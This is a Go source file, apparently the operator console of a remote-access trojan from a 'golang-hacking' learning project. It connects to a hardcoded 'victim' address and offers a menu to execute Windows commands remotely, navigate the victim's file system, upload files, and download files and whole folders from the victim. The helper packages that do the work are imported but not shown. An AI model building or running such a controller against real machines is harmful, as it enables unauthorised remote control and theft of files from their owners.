package main

import (
	"bufio"
	"fmt"
	"golang-hacking/P3_malwareServer/core/ExecuteCommandWindows"
	"golang-hacking/P3_malwareServer/core/Move"
	"golang-hacking/P3_malwareServer/core/Upload"
	"golang-hacking/P3_malwareServer/core/download"
	"golang-hacking/P3_malwareServer/core/handleConnection"
	"log"
	"os"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func options() {
	fmt.Println("\t[1] Execute Command")
	fmt.Println("\t[2] Move in File system")
	fmt.Println("\t[3] UploadFile")
	fmt.Println("\t[4] Download File")
	fmt.Println("\t[5] Download Folder")
	fmt.Println("\t[99] Exit")
	fmt.Println()
}

func main() {
	IP := "192.168.10.191"
	Port := "9090"
	connection, err := handleConnection.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl {
		options()
		fmt.Printf("[+] Enter Options ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Command Execution program")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println("[+] Navigating File system on Victim")
			err = Move.NavigateFilesystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println("[+] Uploading File to the Victim")
			err = Upload.UploadFile2Victim(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println("[+] Downloading File from the victim ")
			err = download.DownloadFromVictim(connection)
			DisplayError(err)

		case user_input == "5":
			fmt.Println("[+] Download Folder from victim")
			err := download.DownloadFolderFromVictim(connection)
			DisplayError(err)

		case user_input == "99":
			fmt.Println("[+] Exiting the program")
			loopControl = false

		default:
			fmt.Println("[-] Invalid option, try again ")
		}

	}
}
